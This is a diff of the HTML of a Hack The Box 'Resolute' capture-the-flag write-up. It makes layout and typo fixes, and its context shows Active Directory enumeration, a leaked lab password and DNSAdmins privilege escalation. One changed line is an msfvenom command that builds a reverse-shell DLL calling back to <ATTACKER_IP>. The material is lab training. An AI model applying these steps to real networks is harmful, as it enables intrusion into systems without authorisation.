@@ -64,8 +64,6 @@
       <section id="main_content">
         <h1 id="resolute">Resolute</h1>
 
-<h1 id="skills">Skills</h1>
-
 <h1 id="enumeration">Enumeration</h1>
 
 <p>A basic port scan showed that this is probably a active directory machine.</p>
@@ -104,7 +102,7 @@ SMB         10.10.10.169    445    RESOLUTE         <span class="o">[</span><spa
 
 <p>We don’t see any reference to a domain controller in the name, but we have a domain name: <code class="language-plaintext highlighter-rouge">megabank.local</code> . Now we are going to check every service to see what we can get.</p>
 
-<h2 id="smb">SMB</h2>
+<h3 id="smb">SMB</h3>
 
 <ul>
   <li>Need credentials</li>
@@ -127,7 +125,7 @@ do_connect: Connection to 10.10.10.169 failed <span class="o">(</span>Error NT_S
 Unable to connect with SMB1 <span class="nt">--</span> no workgroup available
 </code></pre></div></div>
 
-<h2 id="rpc">RPC</h2>
+<h3 id="rpc">RPC</h3>
 
 <ul>
   <li>We can enumerate the domain using RPC</li>
@@ -169,7 +167,7 @@ user:[simon] rid:[0x2777]
 user:[naoki] rid:[0x2778]
 </code></pre></div></div>
 
-<h2 id="ldap">LDAP</h2>
+<h3 id="ldap">LDAP</h3>
 
 <ul>
   <li>We can connect without a user to LDAP</li>
@@ -204,6 +202,8 @@ name: megabank
 objectGUID:: RungtOfLt0KPoFxM7C/lqg<span class="o">==</span>
 replUpToDateVector:: AgAAAAAAAAAWAA
 </code></pre></div></div>
+
+<h1 id="foothold">Foothold</h1>
 
 <p>With all this we can try various attacks.</p>
 
@@ -269,8 +269,6 @@ SMB         10.10.10.169    445    RESOLUTE         <span class="o">[</span>-] m
 </code></pre></div></div>
 
 <p>We have credentials <code class="language-plaintext highlighter-rouge">melanie:Welcome123!</code> .</p>
-
-<h1 id="foothold">Foothold</h1>
 
 <p>Actually, melanie is part of the Remote Management Users, so we can connect to the machine.</p>
 
@@ -338,7 +336,7 @@ Global Group memberships     *Domain Users         *Contractors
 The command completed successfully.
 </span></code></pre></div></div>
 
-<p>He is the group <strong>Contractors</strong> which is not a common group in active directory. After executing PoweUp.ps1 and winPEAS I have nothing, so let’s do a manual enumeration. Since there is not much to do on the box, let’s try to find files where the name <strong>ryan</strong> is mentioned.</p>
+<p>He is the group <strong>Contractors</strong> which is not a common group in active directory. After executing PowerUp.ps1 and winPEAS I have nothing, so let’s do a manual enumeration. Since there is not much to do on the box, let’s try to find files where the name <strong>ryan</strong> is mentioned.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>findstr /SI <span class="s2">"passw pwd ryan"</span> <span class="k">*</span>.xml <span class="k">*</span>.ini <span class="k">*</span>.txt <span class="k">*</span>.ps1 <span class="k">*</span>.bat <span class="k">*</span>.config
 </code></pre></div></div>
@@ -353,7 +351,7 @@ PSTranscripts<span class="se">\2</span>0191203<span class="se">\P</span>owerShel
 
 <h1 id="privilege-escalation">Privilege escalation</h1>
 
-<p>From the previuos enumeration we could see that there is not much to do in the box, so the path to Administrator from Ryan must come from a new privilege that this user has.</p>
+<p>From the previous enumeration we could see that there is not much to do in the box, so the path to Administrator from Ryan must come from a new privilege that this user has.</p>
 
 <p>If we use bloodhound to enumerate the domain, we will see that the user ryan is part of the <strong>DNSAdmin</strong> group, which means that we may have a possibility to escalate privilege.</p>
 
@@ -361,7 +359,7 @@ PSTranscripts<span class="se">\2</span>0191203<span class="se">\P</span>owerShel
   <li>First we create a DLL with a reverse shell as payload</li>
 </ul>
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-a</span> x64 <span class="nt">-p</span> windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;ATTACKER_IP&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;PORT&gt; <span class="nt">-f</span> dll <span class="o">&gt;</span> exploit.dll
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;ATTACKER_IP&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;PORT&gt; <span class="nt">-f</span> dll <span class="nt">-a</span> x64 <span class="o">&gt;</span> exploit.dll
 </code></pre></div></div>
 
 <ul>
